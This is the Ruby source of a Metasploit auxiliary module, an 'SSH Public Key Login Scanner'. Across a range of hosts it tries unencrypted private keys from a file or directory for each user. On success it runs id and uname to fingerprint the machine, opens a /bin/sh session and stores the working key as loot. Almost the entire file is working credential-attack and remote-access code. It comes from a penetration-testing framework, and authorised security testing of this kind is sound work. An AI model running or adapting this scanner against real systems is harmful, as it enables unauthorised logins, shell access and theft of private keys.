##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'net/ssh'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::CommandShell

  attr_accessor :ssh_socket, :good_credentials, :good_key, :good_key_data

  def initialize
    super(
      'Name'        => 'SSH Public Key Login Scanner',
      'Description' => %q{
        This module will test ssh logins on a range of machines using
        a defined private key file, and report successful logins.
        If you have loaded a database plugin and connected to a database
        this module will record successful logins and hosts so you can
        track your access.

        Note that password-protected key files will not function with this
        module -- it is designed specifically for unencrypted (passwordless)
        keys.

        Key files may be a single private (unencrypted) key, or several private
        keys concatenated together as an ASCII text file. Non-key data should be
        silently ignored.
      },
      'Author'      => ['todb'],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(22),
        OptPath.new('KEY_FILE', [false, 'Filename of one or several cleartext private keys.'])
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptString.new('SSH_KEYFILE_B64', [false, 'Raw data of an unencrypted SSH public key. This should be used by programmatic interfaces to this module only.', '']),
        OptPath.new('KEY_DIR', [false, 'Directory of several cleartext private keys. Filenames must not begin with a dot, or end in ".pub" in order to be read.']),
        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )

    deregister_options('RHOST','PASSWORD','PASS_FILE','BLANK_PASSWORDS','USER_AS_PASS')

    @good_credentials = {}
    @good_key = ''
    @strip_passwords = true

  end

  def key_dir
    datastore['KEY_DIR']
  end

  def rport
    datastore['RPORT']
  end

  def ip
    datastore['RHOST']
  end

  def read_keyfile(file)
    if file == :keyfile_b64
      keyfile = datastore['SSH_KEYFILE_B64'].unpack("m*").first
    elsif file.kind_of? Array
      keyfile = ''
      file.each do |dir_entry|
        next unless File.readable? dir_entry
        keyfile << File.open(dir_entry, "rb") {|f| f.read(f.stat.size)}
      end
    else
      keyfile = File.open(file, "rb") {|f| f.read(f.stat.size)}
    end
    keys = []
    this_key = []
    in_key = false
    keyfile.split("\n").each do |line|
      in_key = true if(line =~ /^-----BEGIN [RD]SA PRIVATE KEY-----/)
      this_key << line if in_key
      if(line =~ /^-----END [RD]SA PRIVATE KEY-----/)
        in_key = false
        keys << (this_key.join("\n") + "\n")
        this_key = []
      end
    end
    if keys.empty?
      print_error "#{ip}:#{rport} SSH - No keys found."
    end
    return validate_keys(keys)
  end

  # Validates that the key isn't total garbage. Also throws out SSH2 keys --
  # can't use 'em for Net::SSH.
  def validate_keys(keys)
    keepers = []
    keys.each do |key|
      # Needs a beginning
      next unless key =~ /^-----BEGIN [RD]SA PRIVATE KEY-----\x0d?\x0a/m
      # Needs an end
      next unless key =~ /\n-----END [RD]SA PRIVATE KEY-----\x0d?\x0a?$/m
      # Shouldn't have binary.
      next unless key.scan(/[\x00-\x08\x0b\x0c\x0e-\x1f\x80-\xff]/).empty?
      # Add more tests to taste.
      keepers << key
    end
    if keepers.empty?
      print_error "#{ip}:#{rport} SSH - No valid keys found"
    end
    return keepers
  end

  def pull_cleartext_keys(keys)
    cleartext_keys = []
    keys.each do |key|
      next unless key
      next if key =~ /Proc-Type:.*ENCRYPTED/
      this_key = key.gsub(/\x0d/,"")
      next if cleartext_keys.include? this_key
      cleartext_keys << this_key
    end
    if cleartext_keys.empty?
      print_error "#{ip}:#{rport} SSH - No valid cleartext keys found"
    end
    return cleartext_keys
  end

  def do_login(ip,user,port)
    if datastore['KEY_FILE'] and File.readable?(datastore['KEY_FILE'])
      keys = read_keyfile(datastore['KEY_FILE'])
      cleartext_keys = pull_cleartext_keys(keys)
      msg = "#{ip}:#{rport} SSH - Trying #{cleartext_keys.size} cleartext key#{(cleartext_keys.size > 1) ? "s" : ""} per user."
    elsif datastore['SSH_KEYFILE_B64'] && !datastore['SSH_KEYFILE_B64'].empty?
      keys = read_keyfile(:keyfile_b64)
      cleartext_keys = pull_cleartext_keys(keys)
      msg = "#{ip}:#{rport} SSH - Trying #{cleartext_keys.size} cleartext key#{(cleartext_keys.size > 1) ? "s" : ""} per user (read from datastore)."
    elsif datastore['KEY_DIR']
      return :missing_keyfile unless(File.directory?(key_dir) && File.readable?(key_dir))
      unless @key_files
        @key_files = Dir.entries(key_dir).reject {|f| f =~ /^\x2e/ || f =~ /\x2epub$/}
      end
      these_keys = @key_files.map {|f| File.join(key_dir,f)}
      keys = read_keyfile(these_keys)
      cleartext_keys = pull_cleartext_keys(keys)
      msg = "#{ip}:#{rport} SSH - Trying #{cleartext_keys.size} cleartext key#{(cleartext_keys.size > 1) ? "s" : ""} per user."
    else
      return :missing_keyfile
    end
    unless @alerted_with_msg
      print_status msg
      @alerted_with_msg = true
    end
    cleartext_keys.each_with_index do |key_data,key_idx|
      opt_hash = {
        :auth_methods => ['publickey'],
        :msframework  => framework,
        :msfmodule    => self,
        :port         => port,
        :key_data     => key_data,
        :disable_agent => true,
        :config => false,
        :record_auth_info => true,
        :proxies	=> datastore['Proxies']
      }
      opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
      begin
        ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
          self.ssh_socket = Net::SSH.start(
            ip,
            user,
            opt_hash
          )
        end
      rescue Rex::ConnectionError, Rex::AddressInUse
        return :connection_error
      rescue Net::SSH::Disconnect, ::EOFError
        return :connection_disconnect
      rescue ::Timeout::Error
        return :connection_disconnect
      rescue Net::SSH::AuthenticationFailed
        # Try, try, again
        if @key_files
          vprint_error "#{ip}:#{rport} SSH - Failed authentication, trying key #{@key_files[key_idx+1]}"
        else
          vprint_error "#{ip}:#{rport} SSH - Failed authentication, trying key #{key_idx+1}"
        end
        next
      rescue Net::SSH::Exception => e
        return [:fail,nil] # For whatever reason.
      end
      break
    end

    if self.ssh_socket
      self.good_key = self.ssh_socket.auth_info[:pubkey_id]
      self.good_key_data = self.ssh_socket.options[:key_data]
      proof = ''
      begin
        Timeout.timeout(5) do
          proof = self.ssh_socket.exec!("id\n").to_s
          if(proof =~ /id=/)
            proof << self.ssh_socket.exec!("uname -a\n").to_s
          else
            # Cisco IOS
            if proof =~ /Unknown command or computer name/
              proof = self.ssh_socket.exec!("ver\n").to_s
            else
              proof << self.ssh_socket.exec!("help\n?\n\n\n").to_s
            end
          end
        end
      rescue ::Exception
      end

      # Create a new session from the socket, then dump it.
      conn = Net::SSH::CommandStream.new(self.ssh_socket, '/bin/sh', true)
      self.ssh_socket = nil

      # Clean up the stored data - need to stash the keyfile into
      # a datastore for later reuse.
      merge_me = {
        'USERPASS_FILE'  => nil,
        'USER_FILE'      => nil,
        'PASS_FILE'      => nil,
        'USERNAME'       => user
      }
      if datastore['KEY_FILE'] and !datastore['KEY_FILE'].empty?
        keyfile = File.open(datastore['KEY_FILE'], "rb") {|f| f.read(f.stat.size)}
        merge_me.merge!(
          'SSH_KEYFILE_B64' => [keyfile].pack("m*").gsub("\n",""),
          'KEY_FILE'        => nil
          )
      end

      s = start_session(self, "SSH #{user}:#{self.good_key} (#{ip}:#{port})", merge_me, false, conn.lsock)

      # Set the session platform
      case proof
      when /Linux/
        s.platform = "linux"
      when /Darwin/
        s.platform = "osx"
      when /SunOS/
        s.platform = "solaris"
      when /BSD/
        s.platform = "bsd"
      when /HP-UX/
        s.platform = "hpux"
      when /AIX/
        s.platform = "aix"
      when /Win32|Windows/
        s.platform = "windows"
      when /Unknown command or computer name/
        s.platform = "cisco-ios"
      end

      return [:success, proof]
    else
      return [:fail, nil]
    end
  end

  def do_report(ip, port, user, proof)
    return unless framework.db.active
    keyfile_path = store_keyfile(ip,user,self.good_key,self.good_key_data)
    cred_hash = {
      :host => ip,
      :port => datastore['RPORT'],
      :sname => 'ssh',
      :user => user,
      :pass => keyfile_path,
      :type => "ssh_key",
      :proof => "KEY=#{self.good_key}, PROOF=#{proof}",
      :duplicate_ok => true,
        :active => true
    }
    this_cred = report_auth_info(cred_hash)
  end

  def existing_loot(ltype, key_id)
    framework.db.loots(myworkspace).find_all_by_ltype(ltype).select {|l| l.info == key_id}.first
  end

  def store_keyfile(ip,user,key_id,key_data)
    safe_username = user.gsub(/[^A-Za-z0-9]/,"_")
    case key_data
    when /BEGIN RSA PRIVATE/m
      ktype = "rsa"
    when /BEGIN DSA PRIVATE/m
      ktype = "dsa"
    else
      ktype = nil
    end
    return unless ktype
    ltype = "host.unix.ssh.#{user}_#{ktype}_private"
    keyfile = existing_loot(ltype, key_id)
    return keyfile.path if keyfile
    keyfile_path = store_loot(
      ltype,
      "application/octet-stream", # Text, but always want to mime-type attach it
      ip,
      (key_data + "\n"),
      "#{safe_username}_#{ktype}.key",
      key_id
    )
    return keyfile_path
  end

  def run_host(ip)
    print_status("#{ip}:#{rport} SSH - Testing Cleartext Keys")
    # Since SSH collects keys and tries them all on one authentication session, it doesn't
    # make sense to iteratively go through all the keys individually. So, ignore the pass variable,
    # and try all available keys for all users.
    each_user_pass do |user,pass|
      ret,proof = do_login(ip,user,rport)
      case ret
      when :success
        print_brute :level => :good, :msg => "Success: '#{user}':'#{self.good_key}' '#{proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
        do_report(ip, rport, user, proof)
        :next_user
      when :connection_error
        vprint_error "#{ip}:#{rport} SSH - Could not connect"
        :abort
      when :connection_disconnect
        vprint_error "#{ip}:#{rport} SSH - Connection timed out"
        :abort
      when :fail
        vprint_error "#{ip}:#{rport} SSH - Failed: '#{user}'"
      when :missing_keyfile
        vprint_error "#{ip}:#{rport} SSH - Cannot read keyfile."
      when :no_valid_keys
        vprint_error "#{ip}:#{rport} SSH - No cleartext keys in keyfile."
      end
    end
  end

end
